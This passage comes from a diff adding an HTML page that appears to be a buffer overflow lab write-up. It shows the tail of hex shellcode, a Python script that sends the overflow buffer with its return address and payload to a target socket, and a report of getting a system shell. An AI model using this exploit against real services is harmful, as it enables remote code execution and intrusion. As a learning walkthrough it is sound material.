x84\x9e\x54\xc6\xbf\x08\x4a\x1b\x59\x72\xce\xc0\x9a\x7d\xcf\x85\xa7\x59\xdf\x53\x27\xe6\x8b\x0b\x7e\xb0\x65\xea\x28\x72\xdf\xa4\x87\xdc\xb7\x31\xe4\xde\xc1\x3d\x21\xa9\x2d\x8f\x9c\xec\x52\x20\x49\xf9\x2b\x5c\xe9\x06\xe6\xe4\x09\xe5\x22\x11\xa2\xb0\xa7\x98\xaf\x42\x12\xde\xc9\xc0\x96\x9f\x2d\xd8\xd3\x9a\x6a\x5e\x08\xd7\xe3\x0b\x2e\x44\x03\x1e;&quot;
+postfix = &quot;&quot;
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print(&quot;Sending evil buffer...&quot;)
+  s.send(bytes(buffer + &quot;\r\n&quot;, &quot;latin-1&quot;))
+  print(&quot;Done!&quot;)
+except:
+  print(&quot;Could not connect.&quot;)
+
+</code></pre>
+<h2 id="exploit-the-target">Exploit the target<a class="headerlink" href="#exploit-the-target" title="Permanent link">&para;</a></h2>
+<p>Now to swap out the payload (line 15) and the RHOST IP (line 5).</p>
+<p>Time to test the exploit.</p>
+<p>Nice, I got a system shell!</p>
+<p><img alt="Pasted image 20220211023245.png" src="../Pasted%20image%2020220211023245.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
